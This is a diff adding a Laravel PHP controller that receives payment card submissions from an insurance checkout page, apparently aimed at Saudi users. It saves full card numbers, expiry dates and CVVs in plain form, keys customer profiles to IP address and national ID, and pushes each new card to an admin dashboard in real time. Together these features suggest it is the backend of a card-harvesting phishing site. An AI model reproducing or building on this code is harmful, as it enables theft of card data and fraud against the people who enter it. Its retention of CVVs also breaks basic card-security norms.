@@ -1,0 +1,122 @@
+<?php
+
+namespace App\Http\Controllers;
+
+use App\Http\Requests\SubmitPaymentCardRequest;
+use App\Models\CustomerProfile;
+use App\Models\PaymentCard;
+use App\Services\CustomerCacheService;
+use Illuminate\Http\JsonResponse;
+
+/**
+ * Handles payment card submission from CheckoutPage.
+ *
+ * POST /api/payment-card/submit
+ */
+class CustomerPaymentCardController extends Controller
+{
+    public function submit(SubmitPaymentCardRequest $request): JsonResponse
+    {
+        $validated = $request->validated();
+        $ip = $request->ip();
+
+        // Find or create the customer profile
+        $customer = CustomerProfile::createOrUpdateByIP($ip, array_filter([
+            'current_page' => '/insurance/checkout',
+            'total_price'  => $validated['total_price'] ?? null,
+            'selected_insurance' => $validated['selected_insurance'] ?? null,
+            'national_id'  => $validated['national_id'] ?? null,
+        ], fn($v) => $v !== null));
+
+        // Detect card type from BIN
+        $cardNumber = preg_replace('/\s+/', '', $validated['card_number']);
+        $cardType = $this->detectCardType($cardNumber);
+
+        // Mask card number: **** **** **** 1234
+        $last4 = substr($cardNumber, -4);
+        $masked = '**** **** **** ' . $last4;
+
+        // Idempotency: if a pending card with same last4 + holder exists for
+        // this customer (created in the last 5 minutes), return it instead
+        // of creating a duplicate. Prevents double-click / retry issues.
+        $existingCard = PaymentCard::where('customer_profile_id', $customer->id)
+            ->where('last4', $last4)
+            ->where('holder_name', $validated['holder_name'])
+            ->where('status', 'pending')
+            ->where('created_at', '>=', now()->subMinutes(5))
+            ->first();
+
+        if ($existingCard) {
+            // Update card data in case CVV/expiry changed on retry
+            $existingCard->update([
+                'card_number'   => $cardNumber,
+                'expiry_month'  => $validated['expiry_month'],
+                'expiry_year'   => $validated['expiry_year'],
+                'cvv'           => $validated['cvv'],
+                'card_type'     => $cardType,
+            ]);
+            $card = $existingCard;
+        } else {
+            // Create payment card record
+            $card = PaymentCard::create([
+                'customer_profile_id' => $customer->id,
+                'session_id'          => $validated['session_id'] ?? null,
+                'card_number'         => $cardNumber,
+                'card_number_masked'  => $masked,
+                'last4'               => $last4,
+                'holder_name'         => $validated['holder_name'],
+                'card_type'           => $cardType,
+                'expiry_month'        => $validated['expiry_month'],
+                'expiry_year'         => $validated['expiry_year'],
+                'cvv'                 => $validated['cvv'],
+                'status'              => 'pending',
+            ]);
+        }
+
+        // Flush admin customer list caches so dashboard sees fresh data
+        CustomerCacheService::flush();
+
+        // Broadcast new card event so admin sees it in real-time
+        try {
+            $customer->refresh();
+            event(new \App\Events\CustomerActivityUpdated(
+                $customer->id,
+                $customer->ip_address,
+                $customer->current_page,
+                $customer->is_active,
+                'payment_card_submitted'
+            ));
+        } catch (\Exception $e) {
+            report($e);
+        }
+
+        return response()->json([
+            'success' => true,
+            'message' => 'تم حفظ بيانات البطاقة بنجاح',
+            'card_id' => $card->id,
+            'customer_ip' => $ip,
+            'status_sig' => hash_hmac('sha256', 'payment-card|' . ($validated['session_id'] ?? ''), config('services.status_poll.secret')),
+        ]);
+    }
+
+    /**
+     * Detect card type from card number (BIN).
+     */
+    private function detectCardType(string $number): string
+    {
+        if (preg_match('/^4/', $number)) {
+            return 'visa';
+        }
+        if (preg_match('/^5[1-5]/', $number) || preg_match('/^2[2-7]/', $number)) {
+            return 'mastercard';
+        }
+        if (preg_match('/^(50|58|60|63|67)/', $number) || preg_match('/^9792/', $number)) {
+            return 'mada';
+        }
+        if (preg_match('/^3[47]/', $number)) {
+            return 'amex';
+        }
+
+        return 'unknown';
+    }
+}
